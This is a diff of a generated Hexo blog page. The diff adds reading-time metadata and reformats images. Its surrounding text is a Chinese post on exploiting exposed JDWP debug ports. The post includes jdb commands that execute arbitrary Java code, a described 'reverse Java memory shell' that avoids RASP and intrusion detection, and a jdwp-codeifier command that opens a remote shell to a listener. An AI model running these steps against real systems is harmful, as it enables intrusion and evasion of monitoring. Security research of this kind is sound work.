@@ -226,6 +226,21 @@
     </span>
 
   
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>1.1k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>4 分钟</span>
+    </span>
 </div>
 
         </div>
@@ -240,9 +255,15 @@
 <h2 id="JDWP漏洞利用"><a href="#JDWP漏洞利用" class="headerlink" title="JDWP漏洞利用"></a>JDWP漏洞利用</h2><p>除了通过现有的脚本执行系统命令以外，其实也可以通过Java自带工具jdb执行任意Java代码：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8000</span><br><span class="line">threads   #查找休眠线程</span><br><span class="line">thread 0x25c   #选择休眠线程</span><br><span class="line">stepi</span><br><span class="line">eval java.lang.System.getProperty(&quot;os.name&quot;)</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2023/12/03/%E9%80%9A%E8%BF%87JDWP%E6%BC%8F%E6%B4%9E%E6%B3%A8%E5%85%A5%E4%B8%8D%E4%B8%80%E6%A0%B7%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC/image-20231203201646530.png" alt="image-20231203201646530"></p>
+<img src="/2023/12/03/%E9%80%9A%E8%BF%87JDWP%E6%BC%8F%E6%B4%9E%E6%B3%A8%E5%85%A5%E4%B8%8D%E4%B8%80%E6%A0%B7%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC/image-20231203201646530.png" class="" title="image-20231203201646530">
+
+
+
 <p>但有的类并不能直接使用，会出现找不到该类的情况，例如：</p>
-<p><img src="/2023/12/03/%E9%80%9A%E8%BF%87JDWP%E6%BC%8F%E6%B4%9E%E6%B3%A8%E5%85%A5%E4%B8%8D%E4%B8%80%E6%A0%B7%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC/image-20231203204313228.png" alt="image-20231203204313228"></p>
+<img src="/2023/12/03/%E9%80%9A%E8%BF%87JDWP%E6%BC%8F%E6%B4%9E%E6%B3%A8%E5%85%A5%E4%B8%8D%E4%B8%80%E6%A0%B7%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC/image-20231203204313228.png" class="" title="image-20231203204313228">
+
+
+
 <p>当然也可以通过反射去加载，或者可能还有其他加载方式，不过我也没仔细研究这块，毕竟通过jdb执行代码还是很麻烦</p>
 <h2 id="反向内存Shell"><a href="#反向内存Shell" class="headerlink" title="反向内存Shell"></a>反向内存Shell</h2><p>所谓内存马，应该一般都指内存WebShell，这块已经有非常多的研究文章了。但如果放到JDWP漏洞中来看，可能并不一定适用，因为存在漏洞的应用本身或许不是一个Web应用。而这种情况下无论是通过常规意义上的反弹shell还是下载二进制木马进行进一步利用，都是一个敏感且高危的操作，可能被RASP拦截或者被入侵检测发现。</p>
 <p>既然可以执行Java代码，那么其实可以在Java进程中启动一个线程，通过自定义的逻辑，去反弹出一个执行Java代码的”Shell”，具体实现如下：</p>
@@ -251,7 +272,10 @@
 
 
 <p>服务端通过nc监听即可：</p>
-<p><img src="/2023/12/03/%E9%80%9A%E8%BF%87JDWP%E6%BC%8F%E6%B4%9E%E6%B3%A8%E5%85%A5%E4%B8%8D%E4%B8%80%E6%A0%B7%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC/image-20231204234432620.png" alt="image-20231204234432620"></p>
+<img src="/2023/12/03/%E9%80%9A%E8%BF%87JDWP%E6%BC%8F%E6%B4%9E%E6%B3%A8%E5%85%A5%E4%B8%8D%E4%B8%80%E6%A0%B7%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC/image-20231204234432620.png" class="" title="image-20231204234432620">
+
+
+
 <p>这样就得到了一个交互式的不易被拦截的代码执行Shell，对比正向的内存WebShell，用”反向Java内存Shell”去形容似乎更准确些。按照这个思路，其实还可以写一个”反向Java内存代理”，类似于frp的socks5反向代理功能</p>
 <h2 id="jdwp-codeifier"><a href="#jdwp-codeifier" class="headerlink" title="jdwp-codeifier"></a>jdwp-codeifier</h2><p>对于JDWP漏洞的武器化利用最早可以追溯到2014年的项目：<a target="_blank" rel="noopener" href="https://github.com/IOActive/jdwp-shellifier">https://github.com/IOActive/jdwp-shellifier</a> ，作者通过Python2实现JDWP协议，以设置断点的方式获取线程上下文从而调用Runtime.getRuntime().exec()执行系统命令</p>
 <p>2020年Lz1y借鉴<a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/misc/java_jdwp_debugger.rb">MSF中的利用方式</a>改写jdwp-shellifier，通过对Sleeping的线程发送单步执行事件，完成断点，从而可以直接获取上下文、执行命令，而不用等待断点被击中，项目地址：<a target="_blank" rel="noopener" href="https://github.com/Lz1y/jdwp-shellifier">https://github.com/Lz1y/jdwp-shellifier</a></p>
@@ -259,7 +283,12 @@
 <p>但以上都无法满足前文中的代码执行需求，所以我基于jdwp-shellifier再次改写了一版进阶的JDWP漏洞利用脚本，改名为<a target="_blank" rel="noopener" href="https://github.com/l3yx/jdwp-codeifier">jdwp-codeifier</a>，同样使用不需要等待断点的方式且能够动态执行Java&#x2F;Js代码并获得回显。同时也将上文中的内存Shell内置进了工具中，反弹Java内存Shell：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python jdwp-codeifier.py -t 192.168.65.254 -p 8000 -m rshell -a 127.0.0.1:8080 -l 0.1</span><br><span class="line"># -a 指定接收shell的地址</span><br><span class="line"># -l 指定shell与服务器连接不上时的最大存活时间（分钟）（每隔5秒自动重连）</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2023/12/03/%E9%80%9A%E8%BF%87JDWP%E6%BC%8F%E6%B4%9E%E6%B3%A8%E5%85%A5%E4%B8%8D%E4%B8%80%E6%A0%B7%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC/image-20231204234649972.png" alt="image-20231204234649972"></p>
+<img src="/2023/12/03/%E9%80%9A%E8%BF%87JDWP%E6%BC%8F%E6%B4%9E%E6%B3%A8%E5%85%A5%E4%B8%8D%E4%B8%80%E6%A0%B7%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC/image-20231204234649972.png" class="" title="image-20231204234649972">
+
+
+
+
+
 <p>最后，项目地址：<a target="_blank" rel="noopener" href="https://github.com/l3yx/jdwp-codeifier">https://github.com/l3yx/jdwp-codeifier</a></p>
 
     </div>
@@ -311,6 +340,20 @@
     </span>
     <span class="author" itemprop="copyrightHolder">淚笑</span>
   </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">78k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">4:43</span>
+  </span>
+</div>
   <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
 
